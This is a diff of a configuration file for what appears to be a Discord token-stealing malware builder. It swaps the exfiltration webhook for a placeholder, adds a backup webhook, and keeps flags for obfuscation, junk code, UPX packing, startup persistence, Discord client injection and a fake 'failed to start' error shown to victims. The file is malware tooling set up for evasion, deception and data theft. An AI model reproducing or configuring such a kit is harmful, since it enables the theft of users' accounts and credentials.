@@ -1,4 +1,6 @@
-WEBHOOK = "https://discord.com/api/webhooks/WEBHOOK_HERE"
+WEBHOOK = "YOUR_WEBHOOK_HERE"
+BACKUP_WEBHOOK = "" # Optional
+INJECTION = True
 OBFUSCATION = True    
 JUNK_CODE = True       
 UPX = False            
@@ -8,4 +10,3 @@ ERROR_MESSAGE = "The application failed to start (0xc000007b)."
 USE_ICON = False        
 ICON_PATH = "ignium.ico" 
 STARTUP = True
-INJECTION = True # keep true, dc injection is still in development.
